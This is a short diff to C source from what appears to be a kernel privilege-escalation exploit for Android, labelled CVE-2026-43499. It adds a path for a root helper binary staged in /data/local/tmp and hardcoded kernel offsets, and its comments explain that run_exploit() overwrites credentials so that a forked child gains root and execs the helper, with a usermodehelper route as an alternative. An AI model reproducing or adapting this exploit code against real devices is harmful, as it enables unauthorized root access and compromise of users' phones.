@@ -349,9 +349,17 @@
 #define CRED_COPY_OFF 0x1080
 
 
+/* Where the bootstrap helper is staged for an adb-shell run. The application
+ * passes its own copy down instead, through CVE43499_ROOT_HELPER, because the
+ * APK's copy is at a path that is neither fixed nor writable from here. This
+ * is the route run_exploit() takes: its credential write roots a forked child,
+ * and that child execs the helper itself. */
+#define ROOT_HELPER_PATH "/data/local/tmp/cve-2026-43499-root"
+
 /* usermodehelper root route -- taken from this repository's own profile,
  * because root.c stays RMG's: the kernel execs the app's helper as root and
- * that helper is what serves -c and --late-load. */
+ * that helper is what serves -c and --late-load. Only the fops/pipe route
+ * reaches it, which run_exploit() does not use on this core. */
 #define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
 #define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d0f00ULL
 #define SYSTEM_UNBOUND_WQ_OFF 0x0212b320ULL
